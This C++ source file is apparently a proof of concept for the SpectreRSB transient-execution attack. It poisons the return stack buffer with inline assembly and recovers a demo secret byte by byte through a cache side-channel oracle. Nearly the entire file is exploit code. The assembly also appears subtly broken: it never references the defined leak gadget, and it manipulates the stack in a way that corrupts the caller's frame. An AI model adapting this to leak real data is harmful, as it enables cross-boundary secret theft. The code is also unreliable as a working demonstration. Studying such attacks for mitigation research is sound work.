#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"
#include <iostream>
#include <cstring>

const char *public_data = "xxxxxxxxxxxxxxxx";
const char *private_data = "It's a s3kr3t!!!";
constexpr size_t kAccessorArrayLength = 1024;

CacheSideChannel sidechannel;

void gadget(char *secret_ptr, const std::array<BigByte, 256> &oracle) {
    volatile char temp;
    // Leak the secret byte through speculative execution
    temp &= oracle[*secret_ptr];
}

void speculative(char *secret_ptr, const std::array<BigByte, 256> &oracle) {
    asm volatile(
        "call gadget_label\n"   // Push the return address onto RSB
        "jmp cleanup\n"         // Skip actual execution of gadget
        "gadget_label:\n"
        "pop %%rax\n"           // Pop return address from stack (RSB now mismatched)
        "pop %%rax\n"           // Adjust stack to remove caller frame
        "ret\n"                 // Speculative execution will use RSB, not stack
        "cleanup:\n"
        : : "D"(secret_ptr), "S"(oracle.data()) : "rax"
    );
}

char LeakByteRSB(size_t offset) {
    const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

    for (int run = 0; ; ++run) {
        sidechannel.FlushOracle();
        speculative(const_cast<char*>(&private_data[offset]), oracle);

        std::pair<bool, char> result = sidechannel.RecomputeScores(public_data[offset]);
        if (result.first) {
            return result.second;
        }

        if (run > 100000) {
            std::cerr << "Does not converge at offset " << offset << "\n";
            exit(EXIT_FAILURE);
        }
    }
}

int main() {
    std::cout << "SpectreRSB Attack (Leak private data using RSB)\n";
    size_t len = strlen(private_data);
    for (size_t i = 0; i < len; ++i) {
        std::cout << LeakByteRSB(i);
        std::cout.flush();
    }
    std::cout << "\nDone!\n";
    return 0;
}
